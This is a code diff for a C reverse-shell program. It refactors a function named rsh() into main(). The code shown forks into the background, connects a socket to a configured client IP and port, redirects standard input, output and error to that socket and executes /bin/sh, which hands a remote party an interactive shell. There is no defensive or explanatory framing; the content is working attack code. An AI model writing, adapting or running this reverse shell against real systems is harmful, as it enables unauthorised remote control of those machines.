@@ -16,19 +16,19 @@
 #endif
 /* ================================================== */
 
-void rsh(void) {
+int main(void) {
 	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
 		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
-		exit(1);
+		return (1);
 	}
 
 	pid_t pid = fork();
 	if (pid == -1) {
 		write(2, "[ERROR] fork failed.\n", 21);
-		exit(1);
+		return (1);
 	}
 	if (pid > 0) {
-		exit(0);
+		return (0);
 	}
 
 	int port = CLIENT_PORT;
@@ -45,7 +45,7 @@ void rsh(void) {
 #else
 	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
 		write(2, "[ERROR] connect failed.\n", 24);
-		exit(1);
+		return (1);
 	}
 #endif
 
@@ -54,9 +54,6 @@ void rsh(void) {
 	dup2(sockt, 2);
 	char * const argv[] = {"/bin/sh", NULL};
 	execve("/bin/sh", argv, NULL);
-}
 
-int main(void) {
-	rsh();
 	return (0);
 }
